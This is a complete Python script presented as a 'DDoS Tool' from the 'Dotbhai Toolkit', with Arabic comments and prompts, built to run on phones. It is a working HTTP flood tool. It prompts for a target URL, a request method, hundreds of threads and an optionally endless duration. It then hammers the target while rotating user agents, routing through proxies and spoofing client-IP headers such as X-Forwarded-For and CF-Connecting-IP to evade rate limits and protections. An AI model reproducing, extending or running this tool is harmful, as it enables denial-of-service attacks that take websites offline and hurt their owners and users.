#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS Tool — Dotbhai Toolkit [Pydroid Edition]
HTTP Flood تفاعلي — يشتغل على الموبايل
"""

import os
import sys
import time
import random
import threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ═══════════════════════════════════════════════════════════
# User Agents — قائمة واسعة
# ═══════════════════════════════════════════════════════════
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json,text/plain,*/*",
    "*/*",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.youtube.com/",
]

# ═══════════════════════════════════════════════════════════
# الإحصائيات
# ═══════════════════════════════════════════════════════════
stats_lock = threading.Lock()
stats = {
    "sent": 0,
    "errors": 0,
    "ok": 0,
    "codes": {},
    "start_time": time.time(),
    "running": True,
}


def bump(field, amount=1):
    with stats_lock:
        stats[field] = stats.get(field, 0) + amount


def record_code(code):
    with stats_lock:
        stats["codes"][code] = stats["codes"].get(code, 0) + 1


# ═══════════════════════════════════════════════════════════
# بناء Session
# ═══════════════════════════════════════════════════════════
def build_session(proxy=None):
    s = requests.Session()
    retry = Retry(total=0, connect=0, read=0, redirect=0)
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=100,
        pool_maxsize=100,
        pool_block=False,
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)

    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    })

    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    return s


def rand_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"


# ═══════════════════════════════════════════════════════════
# Worker
# ═══════════════════════════════════════════════════════════
def worker(target, method="GET", payload=None, referer=None, proxy=None):
    session = build_session(proxy)
    ref = referer or random.choice(REFERERS)

    while stats["running"]:
        try:
            session.headers.update({
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": ref,
                "X-Forwarded-For": rand_ip(),
                "X-Real-IP": rand_ip(),
                "X-Originating-IP": rand_ip(),
                "CF-Connecting-IP": rand_ip(),
                "X-Client-IP": rand_ip(),
                "Forwarded": f"for={rand_ip()};proto=http;by={rand_ip()}",
            })

            if method == "POST":
                body = payload or f"a={random.randint(1,999999)}&b={random.randint(1,999999)}"
                r = session.post(target, data=body, timeout=5, allow_redirects=False)
            elif method == "HEAD":
                r = session.head(target, timeout=5, allow_redirects=False)
            elif method == "PUT":
                r = session.put(target, data=payload or "x" * 1024, timeout=5, allow_redirects=False)
            else:
                sep = "&" if "?" in target else "?"
                cb = f"{sep}_={random.randint(1, 99999999)}&r={random.randint(1,99999999)}"
                r = session.get(target + cb, timeout=5, allow_redirects=False)

            bump("sent")
            if r.status_code < 400:
                bump("ok")
            record_code(r.status_code)

        except requests.exceptions.RequestException:
            bump("errors")
            try:
                session.close()
            except Exception:
                pass
            session = build_session(proxy)
        except Exception:
            bump("errors")


# ═══════════════════════════════════════════════════════════
# شاشة الإحصائيات
# ═══════════════════════════════════════════════════════════
def stats_loop():
    last_sent = 0
    while stats["running"]:
        time.sleep(1)
        with stats_lock:
            sent = stats["sent"]
            errs = stats["errors"]
            ok = stats["ok"]
            codes = dict(stats["codes"])
            elapsed = time.time() - stats["start_time"]

        rps = sent - last_sent
        last_sent = sent

        top_codes = " ".join(
            f"{c}:{n}" for c, n in sorted(codes.items(), key=lambda x: -x[1])[:4]
        )

        print(
            f"\r\033[92mRPS:{rps:>5}\033[0m "
            f"\033[93mSent:{sent:>8}\033[0m "
            f"\033[92mOK:{ok:>7}\033[0m "
            f"\033[91mErr:{errs:>6}\033[0m "
            f"\033[96m{int(elapsed)}s\033[0m "
            f"\033[95m{top_codes}\033[0m   ",
            end="", flush=True
        )


# ═══════════════════════════════════════════════════════════
# تحميل بروكسيات
# ═══════════════════════════════════════════════════════════
def load_proxies(path):
    proxies = []
    if not os.path.isfile(path):
        return proxies
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                if not line.startswith(("http://", "https://", "socks")):
                    line = "http://" + line
                proxies.append(line)
    return proxies


# ═══════════════════════════════════════════════════════════
# Banner
# ═══════════════════════════════════════════════════════════
def banner():
    os.system("clear" if os.name != "nt" else "cls")
    print("\033[95m" + "═" * 60 + "\033[0m")
    print("  \033[1;93mDDoS Tool — Dotbhai Toolkit\033[0m")
    print("  \033[96mPydroid Edition — HTTP Flood\033[0m")
    print("\033[95m" + "═" * 60 + "\033[0m\n")


def ask(prompt, default=None):
    p = f"\033[93m>>\033[0m {prompt}"
    if default is not None:
        p += f" \033[96m[{default}]\033[0m"
    p += ": "
    val = input(p).strip()
    return val if val else default


# ═══════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════
def main():
    banner()

    # ═══ الهدف ═══
    target = ask("الهدف (URL)")
    if not target:
        print("\n  \033[91m[!]\033[0m لازم URL.\n")
        return
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    # ═══ الطريقة ═══
    print("\n  \033[96mالطرق المتاحة:\033[0m GET / POST / HEAD / PUT")
    method = (ask("الطريقة", "GET") or "GET").upper()
    if method not in ("GET", "POST", "HEAD", "PUT"):
        method = "GET"

    # ═══ عدد الثريدات ═══
    threads_input = ask("عدد الثريدات", "200")
    try:
        num_threads = int(threads_input)
        if num_threads < 1:
            num_threads = 200
    except Exception:
        num_threads = 200

    # ═══ المدة ═══
    duration_input = ask("مدة الهجوم بالثواني (0 = لا نهائي)", "60")
    try:
        duration = int(duration_input)
    except Exception:
        duration = 60

    # ═══ Payload لو POST ═══
    payload = None
    if method in ("POST", "PUT"):
        payload = ask("Payload للـ POST (Enter = عشوائي)", None)

    # ═══ Referer ═══
    referer = ask("Referer (Enter = عشوائي)", None)

    # ═══ Proxies ═══
    proxy_path = ask("ملف proxies (Enter = بدون)", None)
    proxies = []
    if proxy_path:
        proxies = load_proxies(proxy_path)
        print(f"  \033[92m[+]\033[0m تم تحميل {len(proxies)} proxy")

    # ═══ ملخص ═══
    print("\n\033[95m" + "═" * 60 + "\033[0m")
    print(f"  \033[96mTarget  :\033[0m {target}")
    print(f"  \033[96mMethod  :\033[0m {method}")
    print(f"  \033[96mThreads :\033[0m {num_threads}")
    print(f"  \033[96mDuration:\033[0m {'لا نهائي' if duration == 0 else f'{duration}s'}")
    print(f"  \033[96mProxies :\033[0m {len(proxies) if proxies else 'بدون'}")
    print("\033[95m" + "═" * 60 + "\033[0m")

    confirm = ask("\nابدأ؟ (y/n)", "y").lower()
    if confirm != "y":
        print("  \033[93m[!]\033[0m إلغاء.\n")
        return

    print()

    # ═══ بدء إحصائيات ═══
    stats["start_time"] = time.time()
    st = threading.Thread(target=stats_loop, daemon=True)
    st.start()

    # ═══ إطلاق الثريدات ═══
    workers = []
    for i in range(num_threads):
        proxy = proxies[i % len(proxies)] if proxies else None
        t = threading.Thread(
            target=worker,
            args=(target, method, payload, referer, proxy),
            daemon=True,
        )
        t.start()
        workers.append(t)
        # تأخير صغير عشان متزحمش الجهاز لحظيًا
        if i % 50 == 0 and i > 0:
            time.sleep(0.05)

    # ═══ الانتظار ═══
    try:
        if duration > 0:
            time.sleep(duration)
            stats["running"] = False
        else:
            while stats["running"]:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  \033[93m[!]\033[0m إيقاف يدوي...")
        stats["running"] = False

    for w in workers:
        w.join(timeout=1)

    # ═══ ملخص ═══
    elapsed = time.time() - stats["start_time"]
    avg_rps = stats["sent"] / max(1, elapsed)
    print(f"\n\n\033[95m{'═' * 60}\033[0m")
    print(f"  \033[92mTotal Sent  :\033[0m {stats['sent']}")
    print(f"  \033[92mSuccessful  :\033[0m {stats['ok']}")
    print(f"  \033[91mErrors      :\033[0m {stats['errors']}")
    print(f"  \033[96mDuration    :\033[0m {elapsed:.2f}s")
    print(f"  \033[93mAvg RPS     :\033[0m {avg_rps:.2f}")
    print(f"  \033[95mStatus Codes:\033[0m")
    for code, n in sorted(stats["codes"].items(), key=lambda x: -x[1]):
        print(f"     {code} → {n}")
    print(f"\033[95m{'═' * 60}\033[0m\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  \033[93m[!]\033[0m خروج.\n")
    except Exception as e:
        print(f"\n\033[91m[!]\033[0m خطأ: {e}\n")
